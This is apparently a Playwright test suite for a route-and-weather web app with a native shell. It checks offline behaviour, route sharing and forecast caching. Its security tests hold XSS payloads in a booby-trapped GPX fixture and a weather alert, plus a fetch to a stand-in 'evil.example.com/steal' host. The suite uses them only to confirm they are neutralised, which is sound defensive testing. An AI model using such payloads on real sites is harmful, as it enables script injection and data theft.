import { readFile } from 'node:fs/promises';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { expect, test } from '@playwright/test';
import { findRemoteAssets } from '../scripts/build-www.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
const FIXTURE = join(HERE, 'fixtures/route.gpx');
const WWW = join(HERE, '../www');
const PUBLIC = join(HERE, '../../public');

/** Nothing but the app's own origin. This is what the native app really has when
 *  the phone is out of coverage, and what App Store review expects. */
async function goOffline(page) {
  await page.route('**/*', (route) => {
    const url = route.request().url();
    return url.startsWith('http://127.0.0.1') ? route.continue() : route.abort();
  });
}

/** Uncaught exceptions and failed same-origin requests: both mean the bundle is broken. */
function watchForBreakage(page) {
  const crashes = [];
  const missing = [];
  page.on('pageerror', (e) => crashes.push(e.message));
  page.on('response', (r) => {
    if (r.status() >= 400 && r.url().startsWith('http://127.0.0.1')) {
      missing.push(`${r.status()} ${r.url()}`);
    }
  });
  return { crashes, missing };
}

/** The loader swallows its own failures: it logs and shows an alert, so the route
 *  name can still appear while the track failed to reach the map. Watch for both. */
function watchTheLoader(page) {
  const failures = [];
  page.on('dialog', (d) => {
    failures.push(`alert: ${d.message()}`);
    d.dismiss().catch(() => {});
  });
  page.on('console', (m) => {
    if (m.type() !== 'error') return;
    if (/loader outer error|Cannot read properties|cargando GPX|reading GPX/i.test(m.text())) {
      failures.push(m.text());
    }
  });
  return failures;
}

const mapReady = (page) => page.waitForFunction(() => !!window.map, null, { timeout: 15000 });
const routeName = (page) => page.locator('#rutaName');

/** A track actually drawn on the map, not just a file that parsed. */
const trackDrawn = (page) => page.locator('#map path');

test('boots with no network at all', async ({ page }) => {
  const { crashes, missing } = watchForBreakage(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  // Every library the app needs must come from the bundle, not a CDN.
  const globals = await page.evaluate(() => ({
    leaflet: typeof window.L,
    leafletGpx: typeof window.L?.GPX,
    compass: typeof window.L?.Control?.Compass,
    sunCalc: typeof window.SunCalc,
    pako: typeof window.pako,
    toGeoJSON: typeof window.toGeoJSON,
    loader: typeof window.cwLoadGPXFromString,
    injector: typeof window.cwInjectGPXFromText,
  }));
  expect(globals).toEqual({
    leaflet: 'object',
    leafletGpx: 'function',
    compass: 'function',
    sunCalc: 'object',
    pako: 'object',
    toGeoJSON: 'object',
    loader: 'function',
    injector: 'function',
  });

  expect(missing, 'the bundle is missing files').toEqual([]);
  expect(crashes, 'the page threw while booting').toEqual([]);
});

// Not just index.html: marker icons and a donation button were being pulled from
// other sites by the scripts and the help pages, which an offline app cannot do.
test('the bundle fetches no assets from anywhere else', async () => {
  expect(await findRemoteAssets(WWW)).toEqual([]);
});

// Read from public/, not from the bundle: build-www.mjs strips these blocks, so
// asserting over www/ would pass no matter how broken the markup is.
test('structured data parses', async () => {
  const html = await readFile(join(PUBLIC, 'index.html'), 'utf8');
  const blocks = [...html.matchAll(/<script type="application\/ld\+json">([\s\S]*?)<\/script>/g)];
  expect(blocks.length, 'no structured data found at all').toBeGreaterThan(0);
  for (const [, block] of blocks) {
    expect(() => JSON.parse(block)).not.toThrow();
  }
});

test('loads a route from the file picker', async ({ page }) => {
  const loaderFailures = watchTheLoader(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  await expect(routeName(page)).toContainText('Masnou');
  await expect(trackDrawn(page)).not.toHaveCount(0);
  expect(loaderFailures).toEqual([]);
});

test('loads a route from ?gpx_url=', async ({ page }) => {
  const gpx = await readFile(FIXTURE, 'utf8');
  const loaderFailures = watchTheLoader(page);
  await goOffline(page);
  // Registered after goOffline on purpose: Playwright runs the most recent handler
  // first, so this one wins over the catch-all and serves the fixture from memory.
  await page.route(
    (url) => url.pathname === '/hosted-route.gpx',
    (route) => route.fulfill({ status: 200, contentType: 'application/gpx+xml', body: gpx })
  );

  await page.goto('/index.html?gpx_url=/hosted-route.gpx&name=Hosted%20route');
  await mapReady(page);

  await expect(routeName(page)).toContainText('Masnou');
  await expect(trackDrawn(page)).not.toHaveCount(0);
  expect(loaderFailures).toEqual([]);
});

/** Stand-in for the bridge Capacitor injects into the web view, implementing the same
 *  MeteoRideShare contract as the iOS and Android plugins. `delayMs` makes a drain slow
 *  enough to collide with a second request, which is the interesting case. */
async function installNativeBridge(page, { routes = [], delayMs = 0 } = {}) {
  await page.addInitScript(
    ({ routes: initial, delayMs: delay }) => {
      const pending = [...initial];
      window.__delivered = [];
      window.__enqueue = (route) => pending.push(route);
      window.__swRegistered = false;

      const register = navigator.serviceWorker?.register;
      if (register) {
        navigator.serviceWorker.register = function (...args) {
          window.__swRegistered = true;
          return register.apply(navigator.serviceWorker, args);
        };
      }

      const noop = { addListener: async () => ({ remove() {} }) };
      window.Capacitor = {
        isNativePlatform: () => true,
        getPlatform: () => 'ios',
        Plugins: {
          MeteoRideShare: {
            ...noop,
            consumePending: async () => {
              // Snapshot on arrival, like native code reading its inbox: a route that
              // lands while this call is in flight is NOT in this call's answer.
              const next = pending.shift();
              if (delay) await new Promise((r) => setTimeout(r, delay));
              if (next) window.__delivered.push(next.name);
              return next || {};
            },
          },
          App: noop,
          StatusBar: { setStyle: async () => {}, setBackgroundColor: async () => {} },
          SplashScreen: { hide: async () => {} },
          Filesystem: {
            writeFile: async (opts) => {
              window.__written = { path: opts.path, directory: opts.directory, data: opts.data };
              return { uri: 'file:///tmp/' + opts.path };
            },
          },
          Share: {
            share: async (opts) => {
              window.__shared = opts;
              return { activityType: 'test' };
            },
          },
        },
      };
    },
    { routes, delayMs }
  );
}

test('the native shell hands a shared route to the app', async ({ page }) => {
  const gpx = await readFile(FIXTURE, 'utf8');
  const loaderFailures = watchTheLoader(page);

  await installNativeBridge(page, { routes: [{ name: 'Shared route.gpx', gpx }] });
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  await expect(routeName(page)).toContainText('Masnou');
  await expect(trackDrawn(page)).not.toHaveCount(0);
  // The route arrives before initMap runs; injecting too early used to blow up here.
  expect(loaderFailures).toEqual([]);

  expect(await page.evaluate(() => document.documentElement.className)).toContain('cw-native');
  // The plugin replaces the service-worker handoff; registering it would be wrong.
  expect(await page.evaluate(() => window.__swRegistered)).toBe(false);
});

test('a route arriving mid-drain is not left behind', async ({ page }) => {
  const gpx = await readFile(FIXTURE, 'utf8');
  const loaderFailures = watchTheLoader(page);

  const DELAY = 400;
  await installNativeBridge(page, { delayMs: DELAY });
  await goOffline(page);

  await page.goto('/index.html');
  await mapReady(page);

  // The shell drains once at boot. Let that finish, or it swallows the request below
  // and the test stops exercising anything.
  await page.waitForTimeout(DELAY * 2);

  // Drain one route. The drain then asks again, and that second call comes back empty.
  await page.evaluate((text) => {
    window.__enqueue({ name: 'first.gpx', gpx: text });
    window.cwConsumePendingShare();
  }, gpx);

  // Land the second route while that empty call is still in flight: after it was
  // dispatched and before it resolves. That window is the whole point of the test.
  await page.waitForTimeout(DELAY * 1.5);
  await page.evaluate((text) => {
    window.__enqueue({ name: 'second.gpx', gpx: text });
    window.cwConsumePendingShare();
  }, gpx);

  // Nothing else will trigger a drain. Only re-running after a request that arrived
  // mid-drain can deliver this one.
  await expect
    .poll(() => page.evaluate(() => window.__delivered), { timeout: 10000 })
    .toEqual(['first.gpx', 'second.gpx']);
  expect(loaderFailures).toEqual([]);
});

// leaflet-gpx concatenates waypoint <name> and <desc> into an HTML popup string, so a
// route is executable content. It reaches the app from a link, from another app's share
// sheet, or from a file — and it would run in the origin holding the provider API key,
// with the Capacitor bridge in reach.
test('a booby-trapped route cannot run script', async ({ page }) => {
  const evil = `<?xml version="1.0" encoding="UTF-8"?>
<gpx version="1.1" creator="evil" xmlns="http://www.topografix.com/GPX/1/1">
  <wpt lat="41.479" lon="2.316">
    <name>&lt;img src=x onerror="window.__pwned = 'yes'"&gt;</name>
    <desc>&lt;script&gt;window.__pwned = 'yes'&lt;/script&gt;</desc>
  </wpt>
  <trk><name>Evil</name><trkseg>
    <trkpt lat="41.4790" lon="2.3160"/><trkpt lat="41.4770" lon="2.3050"/>
  </trkseg></trk>
</gpx>`;

  await goOffline(page);
  await page.route(
    (url) => url.pathname === '/evil.gpx',
    (route) => route.fulfill({ status: 200, contentType: 'application/gpx+xml', body: evil })
  );

  await page.goto('/index.html?gpx_url=/evil.gpx');
  await mapReady(page);
  await expect(trackDrawn(page)).not.toHaveCount(0);

  expect(await page.evaluate(() => window.__pwned), 'the route executed script').toBeUndefined();

  // The waypoint text still reaches the user, as text. leaflet-gpx parses
  // asynchronously and adds waypoints after the track, so poll rather than peek once.
  const readPopups = () =>
    page.evaluate(() => {
      const found = [];
      const walk = (layer) => {
        if (layer.getPopup && layer.getPopup()) found.push(String(layer.getPopup().getContent()));
        if (layer.eachLayer) layer.eachLayer(walk);
      };
      window.map.eachLayer(walk);
      return found;
    });
  await expect
    .poll(async () => (await readPopups()).length, { message: 'no waypoint popup was built', timeout: 10000 })
    .toBeGreaterThan(0);

  for (const html of await readPopups()) {
    expect(html).not.toMatch(/<img|<script/i);
    expect(html).toContain('&lt;img');
  }
});

// Official weather alerts arrive through a provider's API as free text written by
// national met services. That text used to be dropped into innerHTML.
test('a hostile weather alert is shown as text', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  const card = await page.evaluate(() => {
    const el = createAlertElement({
      event: '<img src=x onerror="window.__alertPwned = 1"> Warning',
      senderName: '<b>AEMET</b>',
      description: '<script>window.__alertPwned = 1</script> Viento fuerte',
      start: 1700000000,
      end: 1700003600,
    });
    document.body.appendChild(el);
    return {
      text: el.textContent,
      markupElements: el.querySelectorAll('img, script, b').length,
      closeButtons: el.querySelectorAll('button').length,
    };
  });

  // No element was ever created from the text, so nothing could have fired.
  expect(card.markupElements).toBe(0);
  expect(await page.evaluate(() => window.__alertPwned)).toBeUndefined();
  expect(card.text).toContain('Viento fuerte');
  expect(card.text).toContain('AEMET');
  expect(card.closeButtons).toBe(1);
});

// The website's policy comes from public/_headers, a Cloudflare file that is stripped
// from the bundle. The app carries its own, and it matters more here: script running
// in the app reaches window.Capacitor.Plugins.
test('the bundle carries its own content security policy', async ({ page }) => {
  for (const name of ['index.html', 'help.html', 'help_en.html']) {
    const html = await readFile(join(WWW, name), 'utf8');
    const meta = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)"/);
    expect(meta, `${name} has no CSP`).not.toBeNull();
    const policy = meta[1];
    // 'unsafe-inline' in script-src would give back exactly what the policy is for.
    expect(policy).toMatch(/script-src 'self'\s*;/);
    expect(policy).toContain("object-src 'none'");
    expect(policy).toContain("base-uri 'self'");
    // A closed connect-src list is what stops a stolen API key from being posted
    // anywhere. The app, unlike the website, never reaches ?gpx_url=, so it can
    // afford to name its hosts. Bare `https:` would give that away.
    expect(policy).toMatch(/connect-src 'self' https:\/\/\S/);
    expect(policy).not.toMatch(/connect-src[^;]*https:(?:\s|;|$)/);
  }

  // It has to actually apply, not merely be present.
  await goOffline(page);
  await page.addInitScript(() => {
    window.__blocked = [];
    document.addEventListener('securitypolicyviolation', (e) => window.__blocked.push(e.violatedDirective));
  });
  await page.goto('/index.html');
  await mapReady(page);

  await page.evaluate(() => {
    document.body.insertAdjacentHTML('beforeend', '<img src=x onerror="window.__pwned = 1">');
  });
  await page.waitForTimeout(300);

  expect(await page.evaluate(() => window.__pwned)).toBeUndefined();
  expect(await page.evaluate(() => window.__blocked)).toContain('script-src-attr');

  // And the page cannot talk to a host the policy does not name.
  await page.evaluate(() =>
    fetch('https://evil.example.com/steal', { mode: 'no-cors' }).catch(() => {})
  );
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => window.__blocked)).toContain('connect-src');
});

// Komoot to MeteoRide to a head unit: the app has to be able to pass the route on,
// which means handing a real file to the system share sheet.
test('the app can send the loaded route to another app', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  const button = page.locator('#cwShareRoute');
  await expect(button).toHaveCount(1);

  // Nothing loaded yet: it must decline rather than share an empty file or throw.
  await button.click();
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => window.__shared)).toBeFalsy();

  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect(trackDrawn(page)).not.toHaveCount(0);
  await button.click();

  await expect.poll(() => page.evaluate(() => window.__shared)).toBeTruthy();
  const written = await page.evaluate(() => window.__written);
  const shared = await page.evaluate(() => window.__shared);

  // The bytes handed over are the route that was loaded, not a re-rendering of it.
  expect(written.data).toBe(await readFile(FIXTURE, 'utf8'));
  expect(written.directory).toBe('CACHE');
  expect(shared.files).toEqual([`file:///tmp/${written.path}`]);
  expect(written.path).toMatch(/\.gpx$/);
});

// The website must not grow a button that depends on plugins it does not have.
test('the share button exists only in the app', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await expect(page.locator('#cwShareRoute')).toHaveCount(0);
});

// The chain the native build exists for, end to end: a route arrives from another app
// through the share plugin, and goes back out through the share sheet.
test('a route received from another app can be passed on', async ({ page }) => {
  const gpx = await readFile(FIXTURE, 'utf8');
  await installNativeBridge(page, { routes: [{ name: 'Komoot tour.gpx', gpx }] });
  await goOffline(page);

  await page.goto('/index.html');
  await mapReady(page);
  await expect(routeName(page)).toContainText('Masnou');

  await page.locator('#cwShareRoute').click();
  await expect.poll(() => page.evaluate(() => window.__shared)).toBeTruthy();

  const written = await page.evaluate(() => window.__written);
  // What leaves is the route that came in, under the name the sending app gave it.
  expect(written.data).toBe(gpx);
  expect(written.path).toBe('Komoot tour.gpx');
});

/* ---------- riding without coverage ---------- */

/** A forecast the provider would return, at a temperature we can look for. */
function forecastAt(celsius) {
  const hours = Array.from({ length: 72 }, (_, i) =>
    new Date(Date.now() + i * 3600000).toISOString().slice(0, 13) + ':00'
  );
  const fill = (v) => hours.map(() => v);
  return {
    hourly: {
      time: hours,
      temperature_2m: fill(celsius),
      precipitation: fill(0),
      precipitation_probability: fill(5),
      relative_humidity_2m: fill(60),
      wind_speed_10m: fill(12),
      wind_gusts_10m: fill(20),
      winddirection_10m: fill(180),
      weathercode: fill(1),
      uv_index: fill(3),
      is_day: fill(1),
      cloud_cover: fill(20),
    },
  };
}

/** Serves the forecast the control object names, or fails the request. */
async function stubProvider(page, control) {
  await page.route(
    (url) => url.hostname === 'api.open-meteo.com',
    (route) =>
      control.offline
        ? route.abort()
        : route.fulfill({
            status: 200,
            contentType: 'application/json',
            body: JSON.stringify(forecastAt(control.celsius)),
          })
  );
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());
}

const shownTemperatures = (page) =>
  page.evaluate(() =>
    [...document.querySelectorAll('#weatherTable td')]
      .map((c) => c.textContent.trim())
      .filter((t) => /^-?\d+º$/.test(t))
  );

/** Pushes every cached forecast back in time, past the normal 30 minute lifetime. */
const ageTheCache = (page, minutes) =>
  page.evaluate((mins) => {
    for (const key of Object.keys(localStorage)) {
      if (!key.startsWith('cw_weather_')) continue;
      const entry = JSON.parse(localStorage.getItem(key));
      entry.timestamp = Date.now() - mins * 60000;
      localStorage.setItem(key, JSON.stringify(entry));
    }
  }, minutes);

test('an expired forecast is still shown when there is no connection', async ({ page }) => {
  const control = { celsius: 21, offline: false };
  await stubProvider(page, control);

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);

  // An hour and forty minutes later, out of coverage.
  await ageTheCache(page, 100);
  control.offline = true;
  await page.addInitScript(() =>
    Object.defineProperty(navigator, 'onLine', { get: () => false, configurable: true })
  );
  await page.reload();
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  // The forecast is what was downloaded earlier, and the app says how old it is.
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  expect(await shownTemperatures(page)).toContain('21º');
  await expect(page.locator('.notice')).toContainText('1 h 40 min');
});

test('a stale forecast is never used while the connection works', async ({ page }) => {
  const control = { celsius: 21, offline: false };
  await stubProvider(page, control);

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);

  // Same age as the offline case, but the network is fine: it must refetch.
  await ageTheCache(page, 100);
  control.celsius = 5;
  await page.reload();
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  const shown = await shownTemperatures(page);
  expect(shown, 'the old cached forecast was shown instead of a fresh one').not.toContain('21º');
  expect(shown).toContain('5º');
});

test('preparing a route protects its forecast from being cleared', async ({ page }) => {
  const control = { celsius: 21, offline: false };
  await installNativeBridge(page);
  await stubProvider(page, control);

  await page.goto('/index.html');
  await mapReady(page);

  // Nothing cached yet: it should say so rather than claim success.
  await page.locator('#cwPrepareOffline').click();
  await expect(page.locator('.notice')).toContainText(/Load a route|Carga una ruta/);
  expect(await page.evaluate(() => localStorage.getItem('cw_offline_pinned'))).toBeNull();

  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);

  await page.locator('#cwPrepareOffline').click();
  await expect(page.locator('.notice')).toContainText(/Route saved|Ruta preparada/);

  const pinned = await page.evaluate(() => JSON.parse(localStorage.getItem('cw_offline_pinned') || '[]'));
  expect(pinned.length).toBeGreaterThan(0);
  expect(pinned.every((k) => k.startsWith('cw_weather_'))).toBe(true);
});

// Two app-only buttons pushed the toolbar onto a second line at phone width. Any
// future one should fail here rather than in a screenshot nobody takes.
test('the app toolbar stays on one line', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  // Buttons differ in height, so their top edges do not line up even on one row.
  // A wrapped toolbar is taller than its tallest button; an unwrapped one is not.
  const { navHeight, tallestButton, count } = await page.evaluate(() => {
    const nav = document.querySelector('header nav');
    const buttons = [...nav.querySelectorAll('button')].filter((b) => b.offsetParent !== null);
    return {
      navHeight: nav.getBoundingClientRect().height,
      tallestButton: Math.max(...buttons.map((b) => b.getBoundingClientRect().height)),
      count: buttons.length,
    };
  });

  expect(count, 'expected the app toolbar to carry both extra buttons').toBeGreaterThan(4);
  expect(navHeight, `toolbar is ${navHeight}px tall for a ${tallestButton}px button, so it wrapped`)
    .toBeLessThan(tallestButton * 1.5);
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);
});

test('an empty table says why', async ({ page }) => {
  const control = { celsius: 21, offline: false };
  await stubProvider(page, control);
  await page.goto('/index.html');
  await mapReady(page);

  // The provider is unreachable and nothing is cached, which used to render an
  // empty table with no explanation at all.
  control.offline = true;
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect(page.locator('.notice')).toContainText(/not responding|no responde/);
  expect(await shownTemperatures(page)).toEqual([]);
});

test('a provider that recovers through the chain says nothing', async ({ page }) => {
  // First call fails, the rest succeed: that is a working run, not an error.
  let calls = 0;
  await page.route(
    (url) => url.hostname === 'api.open-meteo.com',
    (route) => {
      calls += 1;
      return calls === 1
        ? route.abort()
        : route.fulfill({
            status: 200,
            contentType: 'application/json',
            body: JSON.stringify(forecastAt(21)),
          });
    }
  );
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await page.waitForTimeout(2000);   // past the window the warning would fire in
  await expect(page.locator('.notice')).not.toContainText(/not responding|no responde/);
});

test('a rejected API key is named as such', async ({ page }) => {
  await page.route((url) => url.hostname === 'api.open-meteo.com', (route) =>
    route.fulfill({ status: 401, contentType: 'application/json', body: '{"error":true}' })
  );
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  await expect(page.locator('.notice')).toContainText(/API key/);
});

test('the app reopens on the last route, with no network', async ({ page }) => {
  const control = { celsius: 18, offline: false };
  await installNativeBridge(page);
  await stubProvider(page, control);

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect(routeName(page)).toContainText('Masnou');
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);

  // Out of coverage, cold start, nobody touches the file picker.
  await ageTheCache(page, 90);
  control.offline = true;
  await page.addInitScript(() =>
    Object.defineProperty(navigator, 'onLine', { get: () => false, configurable: true })
  );
  await page.reload();
  await mapReady(page);

  await expect(routeName(page)).toContainText('Masnou');
  await expect(trackDrawn(page)).not.toHaveCount(0);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await expect(page.locator('.notice')).toContainText('1 h 30 min');
});
